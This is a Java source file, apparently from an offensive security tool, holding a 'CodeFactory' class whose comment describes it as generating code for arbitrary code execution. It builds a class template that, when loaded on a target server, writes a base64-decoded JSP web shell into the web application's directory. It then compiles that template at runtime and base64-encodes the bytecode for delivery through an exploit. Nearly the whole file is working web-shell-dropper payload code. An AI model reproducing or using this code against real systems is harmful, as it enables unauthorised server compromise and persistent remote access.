package com.droplab.Utils.Factory;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.compile.JavaStringCompiler;
import sun.misc.BASE64Encoder;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Map;

/**
 * 任意代码执行的代码生成工厂
 */
public class CodeFactory {
    private static CodeFactory codefactory = null;

    private final String uploadShell = "import java.io.PrintWriter;public class %s {public %s(){PrintWriter bsh = null;try {String p=new java.io.File(Thread.currentThread().getContextClassLoader().loadClass(\"%s\").getProtectionDomain().getCodeSource().getLocation().getPath()).getParent();bsh = new PrintWriter(p + \"%s.jsp\");bsh.write(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"%s\")));bsh.close();} catch (Exception e) { }}}";

    public static CodeFactory instance() {
        if (codefactory != null) {

        } else {
            codefactory = new CodeFactory();
        }
        return codefactory;
    }

    public String getUploadShell(String type, String className, String filename, File file, String randomStr) { //获取类名
        try {
            if (randomStr.equals("") || randomStr == null) {
                randomStr = CommonUtils.RandomStr(6);
            }
            String content = "this is testing <||>";
            StringBuffer stringBuffer = new StringBuffer();
            String str = stringBuffer.append(content).append(new String(Files.readAllBytes(file.toPath()))).toString();
            String s = new BASE64Encoder().encode(str.getBytes(StandardCharsets.UTF_8)).replaceAll("\r\n","");
            String code = null;
            if (type.equals("template")) {
                code = String.format(uploadShell, randomStr, randomStr, className, filename, s);
            } else {
                code = String.format(uploadShell, randomStr, randomStr, className, filename, s);
            }
            JavaStringCompiler compiler = new JavaStringCompiler();
            Map<String, byte[]> compile = compiler.compile(randomStr + ".java", code);
            byte[] bytes = compile.get(randomStr);
            return new BASE64Encoder().encode(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
